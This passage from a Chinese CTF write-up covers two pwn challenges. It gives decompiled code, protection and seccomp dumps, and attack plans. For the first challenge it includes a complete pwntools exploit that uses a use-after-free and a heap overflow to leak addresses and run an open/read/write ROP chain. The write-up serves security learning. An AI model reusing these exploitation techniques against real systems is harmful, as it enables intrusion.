/ <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( bins[real_size / <span class="number">16</span>] )                   <span class="comment">// bins?</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = bins[line];</span><br><span class="line">    bins[line] = v5-&gt;next;</span><br><span class="line">    LOBYTE(v5-&gt;pre) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;v5-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( real_size &gt;= cap )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;malloc(): corrupted top chunks&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = chunk_pointer;</span><br><span class="line">    LOBYTE(chunk_pointer-&gt;pre) = <span class="number">1</span>;             <span class="comment">// 上标志位</span></span><br><span class="line">    ptr-&gt;size = real_size;</span><br><span class="line">    chunk_pointer = (chunk_pointer + real_size);<span class="comment">// 移动</span></span><br><span class="line">    cap -= real_size;</span><br><span class="line">    chunk_pointer-&gt;size = cap;</span><br><span class="line">    <span class="keyword">return</span> &amp;ptr-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [rsp+3h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%u%c&quot;</span>, &amp;idx, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0x10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    freee(idx);</span><br><span class="line">    chunk.size_list[idx] = <span class="number">0LL</span>;                 <span class="comment">// uaf?</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __fastcall <span class="title function_">freee</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> size; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> num; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  chunk_head *ptr; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  chunk_head *header; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  header = (chunk.arr_list[a1] - <span class="number">16</span>);</span><br><span class="line">  size = header-&gt;size;</span><br><span class="line">  *chunk.arr_list[a1] = bins[size / <span class="number">16</span>];</span><br><span class="line">  bins[size / <span class="number">16</span>] = header;</span><br><span class="line">  LOBYTE(header-&gt;pre) = <span class="number">0</span>;</span><br><span class="line">  num = <span class="number">0</span>;</span><br><span class="line">  ptr = bins[size / <span class="number">16</span>]-&gt;next;</span><br><span class="line">  <span class="keyword">while</span> ( num &lt;= <span class="number">13</span> &amp;&amp; ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ptr == header )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;free(): double free or corruption (fast)&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ptr = ptr-&gt;next;</span><br><span class="line">    ++num;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// [rsp+Fh] [rbp-11h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%u%c&quot;</span>, &amp;v1, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0x10</span> &amp;&amp; chunk.arr_list[v1] &amp;&amp; (<span class="built_in">puts</span>(<span class="string">&quot;size&quot;</span>), <span class="built_in">scanf</span>(<span class="string">&quot;%u%c&quot;</span>, &amp;size, &amp;v0), size &lt;= chunk.size_list[v1]) )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, chunk.arr_list[v1], size);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+3h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Index&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%u%c&quot;</span>, &amp;idx, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( idx &lt;= <span class="number">0x10</span> &amp;&amp; chunk.arr_list[idx] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(chunk.arr_list[idx]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid index&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3 - __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>修了一下，大概就是这样<br>在 .bss 段模拟了一个堆<br>漏洞在于 UAF 和 数组越位，第 0 个 chunk 的 size 和第 16 个 chunk 的 ptr 重合了<br>相当于可以一直堆溢出。</p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>攻击思路：通过 UAF 泄露程序基地址<br>然后通过堆溢出修改 fd，申请到 stdout 附近，泄露 libc 地址<br>同样地，申请到 environ 附近，泄露栈地址<br>最后申请到栈上，打 ROP.</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sc = <span class="string">&#x27;&#x27;&#x27;brva 0x18C9</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">io = process(elf.path)</span><br><span class="line"><span class="comment"># gdb.attach(io, sc)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">c: <span class="built_in">int</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;=======================&#x27;</span>, <span class="built_in">str</span>(c).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">idx: <span class="built_in">int</span>, size: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx: <span class="built_in">int</span>, size: <span class="built_in">int</span>, content: <span class="built_in">bytes</span></span>):</span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;size&#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">    io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx: <span class="built_in">int</span></span>):</span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">4</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">pie = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x5260</span></span><br><span class="line">success(<span class="string">f&#x27;pie: <span class="subst">&#123;<span class="built_in">hex</span>(pie)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">16</span>, <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">1</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(pie + <span class="number">0x40B0</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">5</span>, <span class="number">0x10</span>)</span><br><span class="line">create(<span class="number">6</span>, <span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">libc.address = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x21b780</span></span><br><span class="line">success(<span class="string">f&#x27;libc: <span class="subst">&#123;<span class="built_in">hex</span>(libc.address)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rdi = libc.address + <span class="number">0x2a3e5</span></span><br><span class="line">rsi = libc.address + <span class="number">0x2be51</span></span><br><span class="line">rdx_r12 = libc.address + <span class="number">0x904a9</span></span><br><span class="line">rsp = libc.address + <span class="number">0x35732</span></span><br><span class="line">open_addr = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_addr = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">flag = pie + <span class="number">0x52b8</span></span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;key~&#x27;</span>*(<span class="number">0x90</span>//<span class="number">4</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x40</span>)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;environ&#x27;</span>]-<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x30</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvline()</span><br><span class="line">stack = u64(io.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>)) - <span class="number">0x1a0</span></span><br><span class="line">success(<span class="string">f&#x27;stack: <span class="subst">&#123;<span class="built_in">hex</span>(stack)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x70</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">payload = p64(rdi)</span><br><span class="line">payload += p64(flag)</span><br><span class="line">payload += p64(rsi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(open_addr)</span><br><span class="line">payload += p64(rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(rsi)</span><br><span class="line">payload += p64(pie + <span class="number">0x4100</span>)</span><br><span class="line">payload += p64(rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_addr)</span><br><span class="line">payload += p64(rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(rsi)</span><br><span class="line">payload += p64(pie+<span class="number">0x4100</span>)</span><br><span class="line">payload += p64(rdx_r12)</span><br><span class="line">payload += p64(<span class="number">0x100</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_addr)</span><br><span class="line">payload += <span class="string">b&#x27;flag\0\0\0\0&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x150</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x80</span>)</span><br><span class="line">payload += p64(stack)</span><br><span class="line">edit(<span class="number">0</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x70</span>)</span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x70</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload += p64(rsp)</span><br><span class="line">payload += p64(pie+<span class="number">0x5210</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="Stack-Over-Flow"><a href="#Stack-Over-Flow" class="headerlink" title="Stack_Over_Flow"></a>Stack_Over_Flow</h2><h3 id="保护-1"><a href="#保护-1" class="headerlink" title="保护"></a>保护</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Arch:       amd64-64-little</span><br><span class="line">RELRO:      Full RELRO</span><br><span class="line">Stack:      No canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        PIE enabled</span><br><span class="line">SHSTK:      Enabled</span><br><span class="line">IBT:        Enabled</span><br></pre></td></tr></table></figure></div>
+<p>没 canary，好耶</p>
+<h3 id="沙箱-1"><a href="#沙箱-1" class="headerlink" title="沙箱"></a>沙箱</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x0d 0xc000003e  if (A != ARCH_X86_64) goto 0015</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x0a 0xffffffff  if (A != 0xffffffff) goto 0015</span><br><span class="line"> 0005: 0x15 0x09 0x00 0x00000002  if (A == open) goto 0015</span><br><span class="line"> 0006: 0x15 0x08 0x00 0x00000003  if (A == close) goto 0015</span><br><span class="line"> 0007: 0x15 0x07 0x00 0x0000003b  if (A == execve) goto 0015</span><br><span class="line"> 0008: 0x15 0x06 0x00 0x00000142  if (A == execveat) goto 0015</span><br><span class="line"> 0009: 0x15 0x00 0x04 0x00000000  if (A != read) goto 0014</span><br><span class="line"> 0010: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0011: 0x15 0x00 0x03 0x00000000  if (A != 0x0) goto 0015</span><br><span class="line"> 0012: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0013: 0x15 0x00 0x01 0x00000000  if (A != 0x0) goto 0015</span><br><span class="line"> 0014: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0015: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="逆向分析-1"><a href="#逆向分析-1" class="headerlink" title="逆向分析"></a>逆向分析</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  initstream();</span><br><span class="line">  vuln();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">initstream</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  seed = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(seed);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i &lt;= <span class="number">2</span>; i = rand() % <span class="number">5</span> )</span><br><span class="line">    ;</span><br><span class="line">  n_mian = main * i;</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x1000u</span>LL);</span><br><span class="line">  sandbox();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x2000u</span>LL);</span><br><span class="line">  buf -= <span class="number">84</span>;</span><br><span class="line">  buf2 = buf + <span class="number">0x20</span>;</span><br><span class="line">  buf[<span class="number">0x20</span>] = (buf + <span class="number">0x200</span>);</span><br><span class="line">  buf2[<span class="number">1</span>] = bye;</span><br><span class="line">  chance = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to YCB2025!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x2000u</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( chance &gt; <span class="number">2</span> )                             <span class="comment">// 3 次机会</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Bye~&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  ++chance;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__int64 <span class="title function_">sub_1357</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;magic number:%lld\n&quot;</span>, n_mian);</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">signed</span> __int64 <span class="title function_">bye</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;bye~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> sys_exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>同样修了一下，能溢出3次，<br>当然从伪代码看不出栈溢出<br>实际上也是模拟，<br>以下是 vuln 的部分汇编</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov     rax, cs:buf2</span><br><span class="line">mov     rbp, rax</span><br><span class="line">mov     rsp, rbp</span><br><span class="line">xor     rax, rax</span><br><span class="line">pop     rbp</span><br><span class="line">retn</span><br></pre></td></tr></table></figure></div>
+<p>漏洞就在于栈溢出</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><p>攻击思路：通过部分溢出覆盖返回地址低位<br>跳到 sub_1357(), 泄露程序基地址<br>然后利用 bye 的 syscall 打 srop<br>栈迁移到已知地址段，再 srop 打 syscall_mprotect<br>写 shellcode 再跳转</p>
